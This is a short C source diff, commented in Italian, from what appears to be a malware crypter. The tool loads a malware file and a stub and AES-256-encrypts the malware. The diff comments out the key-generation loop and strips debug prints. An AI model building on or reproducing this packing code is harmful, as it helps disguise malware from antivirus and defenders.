@@ -90,10 +90,12 @@ int main(int argc, char* argv[]){
     unsigned char key[32];
     srand((unsigned int)time(NULL));
 
-    for(int i = 0; i< 32; i++){
+   /*
+  for(int i = 0; i< 32; i++){
         key[i] = (unsigned char) (rand() % 256);
         printf("chiave: %x\n", key[i]);
     }
+   */ 
 
 
     //////////////////////////////
@@ -120,19 +122,7 @@ int main(int argc, char* argv[]){
 
     //////////////////////////////
     //copio i raw bytes dei file malwere e stub in due array di unsigned char
-    for(int i = 0; i < 2000; i++){
-        printf("%c",malware[i]);
-    }
-    printf("\n\n\n\n");
-    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
-    for(int i = 0; i < 2000; i++){
-        printf("%c",malware[i]);
-    }
-
-    AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decripto in AES-256 il malware
-    for(int i = 0; i < 5000; i++){
-        printf("%c",malware[i]);
-    }
+    
     AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
 
 
